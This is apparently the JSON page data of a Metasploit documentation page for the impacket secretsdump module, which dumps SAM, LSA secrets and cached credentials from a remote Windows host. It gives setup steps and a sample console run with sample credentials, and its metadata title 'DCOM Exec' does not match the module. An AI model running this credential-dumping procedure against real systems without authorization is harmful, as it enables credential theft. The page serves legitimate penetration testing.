{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/smb/impacket/secretsdump","result":{"data":{"moduleMetadataJson":{"id":"9cec0eff-ca92-599b-a5b2-797690233ae3","name":"DCOM Exec","fullname":"auxiliary/scanner/smb/impacket/secretsdump","description":"Performs various techniques to dump hashes from the remote machine\n        without executing any agent there. For SAM and LSA Secrets (including\n        cached creds) we try to read as much as we can from the registry and\n        then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and\n        read the rest of the data from there.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/smb/impacket/secretsdump","documentationSlug":"/modules/documentation/auxiliary/scanner/smb/impacket/secretsdump","referencesSlug":"/modules/references/auxiliary/scanner/smb/impacket/secretsdump"},"documentation":{"html":"<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install <a href=\"https://github.com/CoreSecurity/impacket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Impacket</a> v0.9.17 from GitHub. The <code class=\"language-text\">impacket</code> package must be in\nPython's module path, so <code class=\"language-text\">import impacket</code> works from any directory.</li>\n<li>Install <a href=\"https://www.dlitz.net/software/pycrypto/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">pycrypto</a> v2.7 (the experimental release). Impacket requires this\nspecific version.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/smb/impacket/secretsdump</code></li>\n<li>Set: <code class=\"language-text\">RHOSTS</code>, <code class=\"language-text\">SMBUser</code>, <code class=\"language-text\">SMBPass</code></li>\n<li>Do: <code class=\"language-text\">run</code>, see hashes from the remote machine</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/secretsdump) &gt; show options \n\nModule options (auxiliary/scanner/smb/impacket/secretsdump):\n\n   Name        Current Setting  Required  Description\n   ----        ---------------  --------  -----------\n   ExecMethod  smbexec          yes       The method to use for execution (Accepted: smbexec, wmiexec, mmcexec)\n   OutputFile                   no        Write the results to a file\n   RHOSTS      192.168.90.11    yes       The target address range or CIDR identifier\n   SMBDomain   .                no        The Windows domain to use for authentication\n   SMBPass     wakawaka         yes       The password for the specified username\n   SMBUser     spencer          yes       The username to authenticate as\n   THREADS     1                yes       The number of concurrent threads\n\nmetasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/secretsdump) &gt; run\n\n[*] [2018.04.04-17:15:45] Running for 192.168.90.11...\n[*] [2018.04.04-17:15:45] 192.168.90.11 - Service RemoteRegistry is in stopped state\n[*] [2018.04.04-17:15:45] 192.168.90.11 - Service RemoteRegistry is disabled, enabling it\n[*] [2018.04.04-17:15:45] 192.168.90.11 - Starting service RemoteRegistry\n[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for JD\n[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for Skew1\n[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for GBG\n[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for Data\n[REDACTED]\n[*] [2018.04.04-17:15:48] 192.168.90.11 - Cleaning up... \n[*] [2018.04.04-17:15:48] 192.168.90.11 - Stopping service RemoteRegistry\n[*] [2018.04.04-17:15:48] 192.168.90.11 - Restoring the disabled state for service RemoteRegistry\n[*] [2018.04.04-17:15:48] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9cec0eff-ca92-599b-a5b2-797690233ae3"}}}